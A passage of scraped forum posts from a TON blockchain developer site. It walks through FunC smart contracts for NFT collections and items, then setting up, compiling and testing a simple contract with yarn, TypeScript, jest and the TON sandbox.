      throw_unless(403 + counter, item_index <= next_item_index);
      deploy_nft_item(item_index, nft_item_code, item~load_coins(), item~load_ref());
      if (item_index == next_item_index) {
        next_item_index += 1;
      }
    }
  } until ( ~ f?);
  save_data(owner_address, next_item_index, content, nft_item_code, royalty_params);
  return ();
}
```

##### [](#op-3-owner-change-15)op == 3 Owner change

The collection smart contract example provides for the functionality of changing the owner of the collection - the address changes. It works like this:

*   we get the address of the new owner from the body of the message using `load_msg_addr()`
    
*   save data in register `c4` with new owner
    
    if (op == 3) { ;; change owner  
    slice new\_owner = in\_msg\_body~load\_msg\_addr();  
    save\_data(new\_owner, next\_item\_index, content, nft\_item\_code, royalty\_params);  
    return ();  
    }
    

#### [](#get-methods-16)Get methods

In our example, there are four Get methods:

*   get\_collection\_data() - returns information about the collection (owner address, [Token standard](https://github.com/ton-blockchain/TIPs/issues/64) metadata about the collection, and NFT index count)
*   get\_nft\_address\_by\_index(int ​​index) - reproduces the NFT smart contract by index
*   royalty\_params() - returns royalty parameters
*   get\_nft\_content(int index, cell individual\_nft\_content) - returns information on a specific NFT in the collection

> NFT royalties are royalties whenever their NFTs change hands on the secondary market

The get\_collection\_data(), get\_nft\_address\_by\_index(), get\_nft\_content() methods are mandatory for the NFT standard in TON.

##### [](#get_collection_data-17)get\_collection\_data()

We get the address of the owner, the index (the number of currently deployed NFT elements in the collection.) and information about the collection from the `c4` register and simply return this data.

```
(int, cell, slice) get_collection_data() method_id {
  var (owner_address, next_item_index, content, _, _) = load_data();
  slice cs = content.begin_parse();
  return (next_item_index, cs~load_ref(), owner_address);
}
```

##### [](#get_nft_address_by_index-18)get\_nft\_address\_by\_index()

Gets the serial number of the NFT element of this collection and returns the address (MsgAddress) of the smart contract of this NFT element. Reproduction of the address of the smart contract occurs due to StateInit (already sorted it out).

```
slice get_nft_address_by_index(int index) method_id {
	var (_, _, _, nft_item_code, _) = load_data();
	cell state_init = calculate_nft_item_state_init(index, nft_item_code);
	return calculate_nft_item_address(workchain(), state_init);
}
```

##### [](#royalty_params-19)royalty\_params()

We return the royalty parameters. This feature belongs to the extension of the NFT standard, namely [NFTRoyalty](https://github.com/ton-blockchain/TIPs/issues/66).  
`royalty_params()` returns the numerator, denominator, and address to send royalties to. The royalty share is the numerator/denominator. For example, if the numerator = 11 and the denominator = 1000, then the royalty rate is 11/1000 \* 100% = 1.1%. The numerator must be less than the denominator.

```
(int, int, slice) royalty_params() method_id {
	 var (_, _, _, _, royalty) = load_data();
	 slice rs = royalty.begin_parse();
	 return (rs~load_uint(16), rs~load_uint(16), rs~load_msg_addr());
}
```

##### [](#get_nft_content-20)get\_nft\_content()

Gets the serial number of the NFT element of this collection and the individual content of this NFT element, and returns the full content of the NFT element in a format conforming to the [TIP-64 standard](https://github.com/ton-blockchain/TIPs/issues/64).

The important thing to note here is how the content is returned:

```
  return (begin_cell()
					  .store_uint(1, 8) ;; offchain tag
					  .store_slice(common_content)
					  .store_ref(individual_nft_content)
		  .end_cell());
```

`store_uint(1, 8)` \- a similar tag means that the data is stored offline, you can read about data storage tags in the token standard - \[Content representation\]([Issues · ton-blockchain/TIPs · GitHub](https://github.com/ton-blockchain/TIPs/issues/) 64).

Full function code:

```
cell get_nft_content(int index, cell individual_nft_content) method_id {
  var (_, _, content, _, _) = load_data();
  slice cs = content.begin_parse();
  cs~load_ref();
  slice common_content = cs~load_ref().begin_parse();
  return (begin_cell()
					  .store_uint(1, 8) ;; offchain tag
					  .store_slice(common_content)
					  .store_ref(individual_nft_content)
		  .end_cell());
}
```

## [](#nft-itemfc-21)nft-item.fc

The smart contract of a separate NFT begins with auxiliary functions for working with the `с4` register, let’s look at what will be stored in the “storage” of the smart contract of a separate NFT.

*   `index` - the index of this particular NFT
*   `collection_address` - smart contract address of the collection to which this NFT belongs.
*   `owner_address` - address of the current owner of this NFT
*   `content` - content if NFT has a collection - individual NFT content in any format, if NFT does not have a collection - NFT content in TIP-64 format.

> The question may arise, what to pass in `collection_address` and `index`, if there is no collection, in `collection_address` we will pass addr\_none, in `index` we will pass an arbitrary but constant value.

#### [](#loading-data-22)Loading data

Here we use the `store_` functions already familiar to us:

```
() store_data(int index, slice collection_address, slice owner_address, cell content) impure {
	set_data(
		begin_cell()
			.store_uint(index, 64)
			.store_slice(collection_address)
			.store_slice(owner_address)
			.store_ref(content)
			.end_cell()
	);
}
```

But with unloading data and `c4` everything will be more complicated than in previous times.

#### [](#upload-data-23)Upload data

In addition to the data from `c4`, we will also pass the value 0 and -1, depending on whether the NFT is fully initialized and ready for interaction.  
We will get the value as follows:

*   first unload index, collection\_address from `с4`
    
*   and then check the number of bits in the remaining `owner_address` and `cell content` using the `slice_bits()` function
    
    (int, int, slice, slice, cell) load\_data() {  
    slice ds = get\_data().begin\_parse();  
    var (index, collection\_address) = (ds~load\_uint(64), ds~load\_msg\_addr());  
    if (ds.slice\_bits() > 0) {  
    return (-1, index, collection\_address, ds~load\_msg\_addr(), ds~load\_ref());  
    } else {  
    return (0, index, collection\_address, null(), null()); ;; nft not initialized yet  
    }  
    }
    

#### [](#plus-a-helper-function-for-sending-a-message-send_msg-24)Plus a helper function for sending a message send\_msg()

The smart contract of a single NFT must support the following functionality:

*   transfer of ownership of NFTs
*   getting static NFT data

According to the standard, both functionality involves sending messages, so let’s write an auxiliary function for sending messages, which will accept:

*   `slice to_address` - address where to send the message
*   `int amount` - amount of TON
*   `int op` - `op` code to identify the operation
*   `int query_id` - query\_id used in all internal request-response messages. [More](https://ton-blockchain.github.io/docs/#/howto/smart-contract-guidelines?id=smart-contract-guidelines)
*   `builder payload` - some payload we want to send with the message
*   `int send_mode` - Message sending mode, more details about modes can be found in the third lesson

The framework for the send message helper function:

```
() send_msg(slice to_address, int amount, int op, int query_id, builder payload, int send_mode) impure inline {

}
```

> Let me remind you `inline` - means that the code is actually substituted in each place of the function call.

We collect the message, checking that there is a `builder payload` and of course we send the message with the given `mode`.

Final code:

```
() send_msg(slice to_address, int amount, int op, int query_id, builder payload, int send_mode) impure inline {
  var msg = begin_cell()
	.store_uint(0x10, 6) ;; nobounce - int_msg_info$0 ihr_disabled:Bool bounce:Bool bounced:Bool src:MsgAddress -> 011000
	.store_slice(to_address)
	.store_coins(amount)
	.store_uint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
	.store_uint(op, 32)
	.store_uint(query_id, 64);

  if (~ builder_null?(payload)) {
	msg = msg.store_builder(payload);
  }

  send_raw_message(msg.end_cell(), send_mode);
}
```

#### [](#nft-transfer_ownership-function-25)NFT transfer\_ownership() function

In order to effect an NFT ownership transfer, the key things to do are:

*   check different conditions from [standard](https://github.com/ton-blockchain/TIPs/issues/62)
*   send a message to the new owner that ownership has been assigned
*   send excess TON back, or to the specified address (back is written here for ease of understanding)
*   save the new owner in the contract

So the function will take:

`int my_balance` - Balance (after crediting the cost of the incoming message) of the smart contract (in nanoTons). According to [Compute phase](https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview?id=initialization-of-tvm)  
`int index` - index of a single NFT collection  
`slice collection_address` - collection smart contract address  
`slice owner_address` - address of the owner  
`cell content` - cell with NFT content  
`slice sender_address` - address of the sender of the change of ownership message  
`int query_id` - query\_id used in all internal request-response messages. [More](https://ton-blockchain.github.io/docs/#/howto/smart-contract-guidelines?id=smart-contract-guidelines)  
`slice in_msg_body` - what will remain of the message body in `recv_internal()`, inside we need address addresses  
`int fwd_fees` - the transaction cost of the message sent to `recv_internal()`, here it will be used to estimate the TON value needed to perform the transfer operation

The function starts by checking that the address of the “change owner command sender” is equal to the address of the owner, i.e. only the current owner can change.

```
throw_unless(401, equal_slices(sender_address, owner_address));
```

Now we need to parse `force_chain()` from the params.fc file.

```
force_chain(to_owner_address);
```

The `force_chain` function checks that the address is in workchain number 0 (the base workchain). You can read more about addresses and numbers [here](https://github.com/ton-blockchain/ton/blob/master/doc/LiteClient-HOWTO) at the very beginning. Let’s analyze the code from params.fc:  
int workchain() asm “0 PUSHINT”;

```
() force_chain(slice addr) impure {
  (int wc, _) = parse_std_addr(addr);
  throw_unless(333, wc == workchain());
}
```

We define the `workchain()` helper function as a low-level TVM primitive using the `asm` keyword. Integer == 0 we need for comparison.

```
int workchain() asm "0 PUSHINT";
```

To extract the information we need from the address, `parse_std_addr()` is used. `parse_std_addr()` - returns a workchain and a 256-bit integer address from `MsgAddressInt`.

```
() force_chain(slice addr) impure {
  (int wc, _) = parse_std_addr(addr);
  throw_unless(333, wc == workchain());
}
```

And to raise an exception if the workchains are not equal, we will use `throw_unless()`.

Let’s go back to our nft-item.fc function. We get the address of the new owner, check the workchain with the force\_chain() function, and also get the address where to send the notification that the owner has changed.

```
slice new_owner_address = in_msg_body~load_msg_addr();
force_chain(new_owner_address);
slice response_destination = in_msg_body~load_msg_addr();
```

Since the example does not involve the use of a custom payload, we skip it and get the amount of nanoTons from the `forward_amount` body that will be sent to the new owner. Now the function looks like this:

```
() transfer_ownership(int my_balance, int index, slice collection_address, slice owner_address, cell content, slice sender_address, int query_id, slice in_msg_body, int fwd_fees) impure inline {
	throw_unless(401, equal_slices(sender_address, owner_address));

	slice new_owner_address = in_msg_body~load_msg_addr();
	force_chain(new_owner_address);
	slice response_destination = in_msg_body~load_msg_addr();
	in_msg_body~load_int(1); ;; this nft don't use custom_payload
	int forward_amount = in_msg_body~load_coins();
}
```

Next comes the calculation of the Ton value, which will need to be sent back to the address for notification of a change in ownership. I will not stop here, so as not to drag out the lesson, but to make it easier to understand the code that will be below, I advise you to familiarize yourself with \[Transaction fees\] ([The Open Network Docs](https://ton-blockchain.github.io/docs/#/smart-contracts/fees)). Also note that we take into account when calculating that the address can be `addr_none`.

```
int rest_amount = my_balance - min_tons_for_storage();
if (forward_amount) {
  rest_amount -= (forward_amount + fwd_fees);
}
int need_response = response_destination.preload_uint(2) != 0; ;; if NOT addr_none: 00
if (need_response) {
  rest_amount -= fwd_fees;
}
```

If the remaining value is less than zero, we will throw an exception:

throw\_unless(402, rest\_amount >= 0); ;; base nft spends fixed amount of gas, will not check for response

Now we send a notification to the new owner:

```
	if (forward_amount) {
	  send_msg(new_owner_address, forward_amount, op::ownership_assigned(), query_id, begin_cell().store_slice(owner_address).store_slice(in_msg_body), 1);  ;; paying fees, revert on errors
	}
```

After checking the workchain, we will send a notification to the address that was specified for the notification.

```
	if (need_response) {
	  force_chain(response_destination);
	  send_msg(response_destination, rest_amount, op::excesses(), query_id, null(), 1); ;; paying fees, revert on errors
	}
```

And of course we save the changes in the `c4` register. Outcome:

```
() transfer_ownership(int my_balance, int index, slice collection_address, slice owner_address, cell content, slice sender_address, int query_id, slice in_msg_body, int fwd_fees) impure inline {
	throw_unless(401, equal_slices(sender_address, owner_address));

	slice new_owner_address = in_msg_body~load_msg_addr();
	force_chain(new_owner_address);
	slice response_destination = in_msg_body~load_msg_addr();
	in_msg_body~load_int(1); ;; this nft don't use custom_payload
	int forward_amount = in_msg_body~load_coins();

	int rest_amount = my_balance - min_tons_for_storage();
	if (forward_amount) {
	  rest_amount -= (forward_amount + fwd_fees);
	}
	int need_response = response_destination.preload_uint(2) != 0; ;; if NOT addr_none: 00
	if (need_response) {
	  rest_amount -= fwd_fees;
	}

	throw_unless(402, rest_amount >= 0); ;; base nft spends fixed amount of gas, will not check for response

	if (forward_amount) {
	  send_msg(new_owner_address, forward_amount, op::ownership_assigned(), query_id, begin_cell().store_slice(owner_address).store_slice(in_msg_body), 1);  ;; paying fees, revert on errors
	}
	if (need_response) {
	  force_chain(response_destination);
	  send_msg(response_destination, rest_amount, op::excesses(), query_id, null(), 1); ;; paying fees, revert on errors
	}

	store_data(index, collection_address, new_owner_address, content);
}
```

##### [](#external-method-arguments-26)External method arguments

According to the documentation of the [TON virtual machine - TVM](https://ton-blockchain.github.io/docs/tvm.pdf), when an event occurs on an account in one of the TON chains, it triggers a transaction.

Each transaction consists of up to 5 stages. Read more [here](https://ton-blockchain.github.io/docs/#/smart-contracts/tvm_overview?id=transactions-and-phases).

We are interested in **Compute phase**. And to be more specific, what is “on the stack” during initialization. For normal message-triggered transactions, the initial state of the stack looks like this:

5 elements:

*   Smart contract balance (in nanoTons)
*   Incoming message balance (in nanotones)
*   Cell with incoming message
*   Incoming message body, slice type
*   Function selector (for recv\_internal it is 0)

As a result, we get the following code:

```
() recv_internal(int balance, int msg_value, cell in_msg_full, slice in_msg_body)  {

}
```

##### [](#get-data-from-message-body-27)Get data from message body

So the first thing we do in `recv_internal()` is check if the message is empty:

if (in\_msg\_body.slice\_empty?()) { ;; ignore empty messages  
return ();  
}

Next, we begin to parse (read out) the message:

```
slice cs = in_msg_full.begin_parse();
```

We get the flags and check that the message was not returned (here we mean bounced).

```
int flags = cs~load_uint(4);
if (flags & 1) { ;; ignore all bounced messages
    return ();
}
```

Now we skip values that we don’t need, what values can be found [here](https://ton-blockchain.github.io/docs/#/smart-contracts/messages).

```
cs~load_msg_addr(); ;; skip dst
cs~load_coins(); ;; skip value
cs~skip_bits(1); ;; skip extracurrency collection
cs~load_coins(); ;; skip ihr_fee
```

We also get `fwd_fee`, which we will later use to calculate how many Ton to send back after all the manipulations.

Now we get the data from the `c4` register, including `init` , the very value 0 and -1, depending on whether the NFT is fully initialized and ready for interaction.

If the NFT is not ready, check that the sender of the message is the owner of the collection and initialize this NFT

```
(int init?, int index, slice collection_address, slice owner_address, cell content) = load_data();
if (~ init?) {
  throw_unless(405, equal_slices(collection_address, sender_address));
  store_data(index, collection_address, in_msg_body~load_msg_addr(), in_msg_body~load_ref());
  return ();
}
```

Next, we get `op` and `query_id` to build logic using conditional operators:

```
int op = in_msg_body~load_uint(32);
int query_id = in_msg_body~load_uint(64);
```

The first `op` is the transfer of ownership, technically it’s simple: call the `transfer_ownership()` function we declared earlier and finish execution.

```
if (op == op::transfer()) {
  transfer_ownership(my_balance, index, collection_address, owner_address, content, sender_address, query_id, in_msg_body, fwd_fee);
  return ();
}
```

The second `op` is getting static data, so we just send a message with the data:

```
if (op == op::get_static_data()) {
  send_msg(sender_address, 0, op::report_static_data(), query_id, begin_cell().store_uint(index, 256).store_slice(collection_address), 64);  ;; carry all the remaining value of the inbound message
  return ();
}
```

At the end there is an exception, i.e. if the contract does not take some action according to `op`, an exception will be thrown. Final `recv_internal()` code:

```
() recv_internal(int my_balance, int msg_value, cell in_msg_full, slice in_msg_body) impure {
	if (in_msg_body.slice_empty?()) { ;; ignore empty messages
		return ();
	}

	slice cs = in_msg_full.begin_parse();
	int flags = cs~load_uint(4);

	if (flags & 1) { ;; ignore all bounced messages
		return ();
	}
	slice sender_address = cs~load_msg_addr();

	cs~load_msg_addr(); ;; skip dst
	cs~load_coins(); ;; skip value
	cs~skip_bits(1); ;; skip extracurrency collection
	cs~load_coins(); ;; skip ihr_fee
	int fwd_fee = cs~load_coins(); ;; we use message fwd_fee for estimation of forward_payload costs


	(int init?, int index, slice collection_address, slice owner_address, cell content) = load_data();
	if (~ init?) {
	  throw_unless(405, equal_slices(collection_address, sender_address));
	  store_data(index, collection_address, in_msg_body~load_msg_addr(), in_msg_body~load_ref());
	  return ();
	}

	int op = in_msg_body~load_uint(32);
	int query_id = in_msg_body~load_uint(64);

	if (op == op::transfer()) {
	  transfer_ownership(my_balance, index, collection_address, owner_address, content, sender_address, query_id, in_msg_body, fwd_fee);
	  return ();
	}
	if (op == op::get_static_data()) {
	  send_msg(sender_address, 0, op::report_static_data(), query_id, begin_cell().store_uint(index, 256).store_slice(collection_address), 64);  ;; carry all the remaining value of the inbound message
	  return ();
	}
	throw(0xffff);
}
```

#### [](#get-method-get_nft_data-28)Get-method get\_nft\_data()

A smart contract for a separate NFT according to the [standard](https://github.com/ton-blockchain/TIPs/issues/62) must have one mandatory Get method.

This method simply returns data about this individual NFT, namely, unloads data from `c4`:

```
(int, int, slice, slice, cell) get_nft_data() method_id {
  (int init?, int index, slice collection_address, slice owner_address, cell content) = load_data();
  return (init?, index, collection_address, owner_address, content);
}
```

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/10lesson/tenthlesson.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/smartcontract/10lesson/tenthlesson.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/10lesson/tenthlesson.md)

```
# Lesson 10 NFT Standard

In lesson 9, we discussed that there is a division of tokens into non-fungible and fungible ones, as well as what the standard of fungible tokens looks like, in this lesson we will discuss non-fungible tokens and analyze examples according to the standard.

## What is the NFT standard in TON

So, non-fungible tokens are assets, each instance of which is unique (specific) and cannot be replaced by another similar asset. A non-fungible token is some kind of digital entity certificate with the ability to transfer the certificate through some mechanism.

[NFT standard in TON](https://github.com/ton-blockchain/TIPs/issues/62) describes:
- Change of form of ownership.
- A way to combine items in a collection.
- Method of deduplication of the common part of the collection.

> Deduplication - a method of eliminating duplicate copies, repetitive data

As for Jetton, the NFT standard has a master contract - a collection contract and smart contracts for an individual NFT in a collection. There is a great example in the standard: If you release a collection containing 10,000 items, then you deploy 10,001 smart contracts, one collection contract, and 10,000 contracts for each item.

> The NFT standard also explains why exactly this NFT implementation scheme was chosen, with so many contracts, the item is Rationale and the next one.

There are extensions in TON for the [NFT standard](https://github.com/ton-blockchain/TIPs/issues/62) (as of 07/29/2022, some of them are in Drafts):
```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/smartcontract/10lesson/tenthlesson.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 437

[TON Research](/)

# [Create a Pipeline to work with smart contracts - Lesson 1 Simple smart contract in ton-community/sandbox](/t/create-a-pipeline-to-work-with-smart-contracts-lesson-1-simple-smart-contract-in-ton-community-sandbox/437)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 1:58pm  1

## [](#introduction-1)Introduction

The modern tool for working with smart contracts in the TON blockchain is [blueprint](https://github.com/ton-org/blueprint/), it allows you to quickly create a project structure and immediately proceed to convenient development. It is the blueprint that is used in my [lessons](https://github.com/romanovichim/TonFunClessons_Eng) on the FunC smart contract development language.

To successfully work with a blueprint, you need to be able to work with its various components, so in this series of tutorials we will go over:

*   creating a project, a simple smart contract and compiling it using [GitHub - ton-community/func-js: FunC compiler package](https://github.com/ton-community/func-js)
*   test the smart contract using [GitHub - ton-org/sandbox: Local TON emulator](https://github.com/ton-org/sandbox)
*   we will make deployment to the test network convenient: generating a QR code, which we will confirm in the wallet
*   TON is an actor model - smart contracts communicate with each other by messages - we will write a chatbot smart contract that will respond with a message to a message)
*   we will test the chatbot smart contract and learn how to test smart contracts that send messages

Let’s start by creating a simple smart contract and compiling it.

## [](#project-initialization-2)Project initialization

Make a folder for your project and go into it.

```
// Windows example
mkdir test_folder
cd test_folder
```

In this tutorial, we will use the `yarn` package manager

```
	yarn init
```

Let’s initialize the `yarn` and just click on the questions in the console, as this is a test case. After that we should get the package.json file in the folder.

Now let’s add the typescript and the necessary libraries. Install them as dev dependencies:

```
yarn add typescript ts-node @types/node @swc/core --dev
```

Create a `tsconfig.json` file. We need the file for the project compilation configuration. Let’s add to it:

```
{
	"compilerOptions": {
		"target" : "es2020",
		"module" : "commonjs",
		"esModuleInterop" : true,
		"forceConsistentCasingInFileNames": true,
		"strict" : true,
		"skipLibCheck" : true,
		"resolveJsonModule" : true

	},
	"ts-node": {
		"transpileOnly" : true,
		"transpile" : "ts-node/transpilers/swc"
	}
}
```

In this tutorial, we will not dwell on what each line of configurations means, because this tutorial is about smart contracts. Now let’s install the libraries necessary to work with TON:

```
yarn add ton-core ton-crypto @ton-community/func-js  --dev
```

Now let’s create a smart contract on FunC. Create `contracts` folder and `main.fc` file with minimal code:

```
() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {

} 
```

`recv_internal` is called when a smart contract receives an inbound internal message. There are some variables at the stack when [TVM initiates](https://docs.ton.org/learn/tvm-instructions/tvm-overview#initialization-of-tvm), by setting arguments in recv\_internal we give smart-contract code awareness about some of them. T

Now let’s write a script that will compile our smart contract template. Let’s create a `scripts` folder and a `compile.ts` file in it.

So that we can use this script, we need to register it as a parameter in the package manager, i.e. in the `package.json` file, it will look like this:

```
{
  "name": "test_folder",
  "version": "1.0.0",
  "main": "index.js",
  "license": "MIT",
  "devDependencies": {
	"@swc/core": "^1.3.63",
	"@ton-community/func-js": "^0.6.2",
	"@types/node": "^20.3.1",
	"ton-core": "^0.49.1",
	"ton-crypto": "^3.2.0",
	"ts-node": "^10.9.1",
	"typescript": "^5.1.3"
  },
  "scripts": {
	  "compile" : "ts-node ./scripts/compile.ts"
  }
}
```

Now let’s move on to writing the compilation script in the `compile.ts` file. Here we make a reservation that the result of compilation will be the representation of the [bag of Cell](https://docs.ton.org/develop/data-formats/cell-boc) in the format of the base64 encoded string. This result needs to be saved somewhere, so let’s create a `build` folder.

Finally we get to the compilation file, the first thing we do is compile our code using the function `compileFunc`:

```
	import * as fs from "fs";
	import { readFileSync } from "fs";
	import process from "process";
	import { Cell } from "ton-core";
	import { compileFunc } from "@ton-community/func-js";

	async function compileScript() {

		const compileResult = await compileFunc({
			targets: ["./contracts/main.fc"], 
			sources: (path) => readFileSync(path).toString("utf8"),
		});

		if (compileResult.status ==="error") {
			console.log("Error happend");
			process.exit(1);
		}

	}
	compileScript();
```

The resulting hexBoС will be written to the folder:

```
import * as fs from "fs";
import { readFileSync } from "fs";
import process from "process";
import { Cell } from "ton-core";
import { compileFunc } from "@ton-community/func-js";

async function compileScript() {

	const compileResult = await compileFunc({
		targets: ["./contracts/main.fc"], 
		sources: (path) => readFileSync(path).toString("utf8"),
	});

	if (compileResult.status ==="error") {
		console.log("Error happend");
		process.exit(1);
	}

	const hexBoC = 'build/main.compiled.json';

	fs.writeFileSync(
		hexBoC,
		JSON.stringify({
			hex: Cell.fromBoc(Buffer.from(compileResult.codeBoc,"base64"))[0]
				.toBoc()
				.toString("hex"),
		})

	);

}

compileScript();
```

For convenience, you can dilute the code with `console.log()` so that it is clear what worked and what did not when compiling, for example, you can add it to the end:

```
console.log("Compiled, hexBoC:"+hexBoC);
```

Which will output the resulting hexBoC.

## [](#lets-go-to-the-contract-3)Let’s go to the contract

To create contracts, we need the standard FunC function library. Create a folder `imports` inside folder `contracts` and add [this](https://github.com/ton-blockchain/ton/blob/master/crypto/smartcont/stdlib.fc) file there.

Now go to the `main.fc` file and import the library, now the file looks like this:

```
#include "imports/stdlib.fc";

() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {

} 
```

Let’s go over briefly on the contract, detailed analyzes and lessons on FunC starts [here](https://github.com/romanovichim/TonFunClessons_Eng/).

The smart contract that we will write will store the sender address of the internal message and also store the number one in the smart contract. It will also implement the Get method, which, when called, will return the address of the last sender of the message to the contract and one.

An internal message comes to our function, we will first get the service flags from there, and then the sender’s address, which we will save:

```
#include "imports/stdlib.fc";

() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {
	slice cs = in_msg.begin_parse();
	int flags = cs~load_uint(4);
	slice sender_address = cs~load_msg_addr();

} 
```

Let’s save the address and one in the contract, i.e. write the data to register `c4`.

```
#include "imports/stdlib.fc";

() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {
	slice cs = in_msg.begin_parse();
	int flags = cs~load_uint(4);
	slice sender_address = cs~load_msg_addr();

	set_data(begin_cell().store_slice(sender_address).store_uint(1,32).end_cell());
} 
```

It’s time for the Get method, the method will return an address and a number, so let’s start with `(slice,int)`:

```
(slice,int) get_sender() method_id {

}
```

In the method itself, we get the data from the register and return it to the user

```
#include "imports/stdlib.fc";

() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {
	slice cs = in_msg.begin_parse();
	int flags = cs~load_uint(4);
	slice sender_address = cs~load_msg_addr();

	set_data(begin_cell().store_slice(sender_address).store_uint(1,32).end_cell());
} 

(slice,int) get_sender() method_id {
	slice ds = get_data().begin_parse();
	return (ds~load_msg_addr(),ds~load_uint(32));
}
```

Final contract:

```
#include "imports/stdlib.fc";

() recv_internal(int msg_value, cell in_msg, slice in_msg_body) impure {
	slice cs = in_msg.begin_parse();
	int flags = cs~load_uint(4);
	slice sender_address = cs~load_msg_addr();

	set_data(begin_cell().store_slice(sender_address).store_uint(1,32).end_cell());
} 

(slice,int) get_sender() method_id {
	slice ds = get_data().begin_parse();
	return (ds~load_msg_addr(),ds~load_uint(32));
}
```

We start compilation using the `yarn compile` command and get a file c `main.compiled.json` in the `build` folder:

```
{"hex":"b5ee9c72410104010035000114ff00f4a413f4bcf2c80b0102016203020015a1418bda89a1f481a63e610028d03031d0d30331fa403071c858cf16cb1fc9ed5474696b07"}
```

## [](#conclusion-4)Conclusion

The next step is to write [tests](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/simpletest.md) for this smart contract, thanks for your attention.

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/simplesmartcontract.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/pipeline/simplesmartcontract.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/simplesmartcontract.md)

```
# Smart Contract Pipeline Part1 - Writing a Smart Contract 

## Introduction

The modern tool for working with smart contracts in the TON blockchain is [blueprint](https://github.com/ton-org/blueprint/), it allows you to quickly create a project structure and immediately proceed to convenient development. It is the blueprint that is used in my [lessons](https://github.com/romanovichim/TonFunClessons_Eng) on the FunC smart contract development language.

To successfully work with a blueprint, you need to be able to work with its various components, so in this series of tutorials we will go over:

- creating a project, a simple smart contract and compiling it using https://github.com/ton-community/func-js
- test the smart contract using https://github.com/ton-org/sandbox
- we will make deployment to the test network convenient: generating a QR code, which we will confirm in the wallet
- TON is an actor model - smart contracts communicate with each other by messages - we will write a chatbot smart contract that will respond with a message to a message)
- we will test the chatbot smart contract and learn how to test smart contracts that send messages

Let's start by creating a simple smart contract and compiling it.

## Project initialization

Make a folder for your project and go into it.

```

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/simplesmartcontract.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 438

[TON Research](/)

# [Create a Pipeline to work with smart contracts - Lesson 2 Tests for our smart contract in pipeline](/t/create-a-pipeline-to-work-with-smart-contracts-lesson-2-tests-for-our-smart-contract-in-pipeline/438)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 1:59pm  1

## [](#introduction-1)Introduction

In the [first part](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/pipeline/simplesmartcontract.md), we created a project and wrote a simple smart contract, it’s time for tests.

## [](#lets-start-working-on-tests-2)Let’s start working on tests

For tests, we need a testing framework, in our case it will be [jest](https://jestjs.io), we also need to emulate the operation of the blockchain, for this we will use [ton-community/sandbox](https://github.com/ton-community/sandbox). Install:

```
yarn add @ton-community/sandbox jest ts-jest @types/jest ton --dev
```

To use the jest framework, you need a configuration file. Let’s create a file `jets.config.js` and add there:

```
	/** @type {import('ts-jest').JestConfigWithTsJest} */
	module.exports = {
	  preset: 'ts-jest',
	  testEnvironment: 'node',
	};
```

Let’s create a folder for tests - folder `tests`. And inside we will create a file `main.spec.ts`.  
Let’s check if we installed everything correctly by running a primitive test, add the following code to the `main.spec.ts` file:

```
describe("test tests", () => {
	it("test of test", async() => {});
});
```

And run it with the `yarn jest` command, you should see that the tests are passed. For the convenience of running tests, we will modernize the `package.json` file.

```
{
  "name": "third",
  "version": "1.0.0",
  "main": "index.js",
  "license": "MIT",
  "devDependencies": {
	"@swc/core": "^1.3.59",
	"@ton-community/func-js": "^0.6.2",
	"@ton-community/sandbox": "^0.11.0",
	"@types/jest": "^29.5.1",
	"@types/node": "^20.2.1",
	"jest": "^29.5.0",
	"ton": "^13.5.0",
	"ton-core": "^0.49.1",
	"ton-crypto": "^3.2.0",
	"ts-jest": "^29.1.0",
	"ts-node": "^10.9.1",
	"typescript": "^5.0.4"
  },
  "scripts": {
	"compile": "ts-node ./scripts/compile.ts",
	"test": "yarn jest"
  }
}
```

Now we import the compiled contract and `Cell` from `ton-core` into the `main.spec.ts` file so that the contract can be opened:

```
import { Cell } from "ton-core";
import { hex } from "../build/main.compiled.json";

describe("test tests", () => {
	it("test of test", async() => {});
});
```

Get the cell with the code in the test:

```
import { Cell } from "ton-core";
import { hex } from "../build/main.compiled.json";


describe("test tests", () => {
	it("test of test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];


	});
});
```

Let’s move on to using `@ton-community/sandbox`. The first thing to do is to use the local version of the blockchain.

```
import { Cell } from "ton-core";
import { hex } from "../build/main.compiled.json";
import { Blockchain } from "@ton-community/sandbox";

describe("test tests", () => {
	it("test of test", async() => {
		const codeCell = Cell.fromBoc(Buffer.from(hex,"hex"))[0];

		const blockchain = await Blockchain.create();
	});
});
```

For convenience of interaction with the contract, wrappers are used. The simplest wrapper describes the deployment of the contract (namely, what initial data, as well as its methods, or interaction with them).

Create a `wrappers` folder and create a `MainContract.ts` wrapper in it and immediately import the contract type and `ton-core` inside it:

```
import { Contract } from "ton-core";
```

We create a class of our contract by implementing `Contract`:

```
import { Contract } from "ton-core";

export class MainContract implements Contract {

}
```

When creating a class object, a constructor is called, let’s write it, and also import the necessary types - address and cell.

```
import { Address,Cell,Contract } from "ton-core";

export class MainContract implements Contract {
	constructor(
		readonly address: Address,
		readonly init?: { code: Cell, data: Cell }
	){}
}
```

